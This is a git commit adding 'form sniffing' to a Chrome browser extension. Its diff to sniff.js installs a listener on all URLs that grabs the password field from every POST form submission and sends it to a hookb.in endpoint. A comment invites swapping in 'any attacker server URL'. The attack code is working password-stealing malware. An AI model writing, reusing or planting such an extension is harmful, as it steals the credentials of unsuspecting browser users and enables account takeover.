9aaea67b85f97843a097b00b13c0ff85b427bcc7
GGB-21 <49618001+GGB-21@users.noreply.github.com>
2020-11-24 22:53:17 +0530

    Added form sniffing

--- Browser_Extension/sniff.js
+++ Browser_Extension/sniff.js
@@ -1,16 +1,25 @@
-chrome.webRequest.onBeforeRequest.addListener(
-  function(details) {
-    if(details.method == "POST") {
-      console.log(JSON.stringify(details.requestBody.formData['password'][0]));
-      //change url below to any attacker server URL
-      fetch('https://hookb.in/lJyEQ7JowNIrXXZWdJzr', {
-        method: 'post',
-        body: details.requestBody.formData['password'][0],
-    })
-    .then(response => response.json())
-  .then(data => console.log(data));
+//to show extension icon on toolbar
+chrome.runtime.onMessage.addListener(function(request,sender,sendResponse){
+    if(request.todo == "showPageAction"){
+        chrome.tabs.query({active:true, currentWindow: true}, function(tabs){
+            chrome.pageAction.show(tabs[0].id);
+        });
     }
-  },
-  {urls: ["<all_urls>"]},
-  ["requestBody"]
-);
+});
+//sniff form data
+chrome.webRequest.onBeforeRequest.addListener(
+    function(details) {
+      if(details.method == "POST") {
+        console.log(JSON.stringify(details.requestBody.formData['password'][0]));
+        //change url below to any attacker server URL
+        fetch('https://hookb.in/lJyEQ7JowNIrXXZWdJzr', {
+          method: 'post',
+          body: details.requestBody.formData['password'][0],
+        })
+        .then(response => response.json())
+        .then(data => console.log(data));
+      }
+    },
+    {urls: ["<all_urls>"]},
+    ["requestBody"]
+  );
